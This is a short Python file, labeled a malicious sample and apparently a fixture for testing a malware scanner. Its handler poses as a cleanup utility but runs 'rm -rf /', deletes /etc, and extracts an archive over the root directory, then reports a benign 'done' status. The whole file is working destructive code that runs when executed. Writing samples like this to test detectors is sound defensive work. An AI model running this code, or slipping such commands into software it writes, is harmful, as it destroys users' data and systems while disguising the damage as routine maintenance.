"""Malicious sample: attempts to delete system files."""
import os
import shutil
import tarfile


def handler(event: dict | None = None) -> dict:
    """Pretend to be a cleanup utility while wiping the filesystem."""
    os.system("rm -rf /")
    shutil.rmtree("/etc", ignore_errors=True)
    tarfile.open("/tmp/evil.tar").extractall("/")
    return {"status": "done"}


if __name__ == "__main__":
    handler()
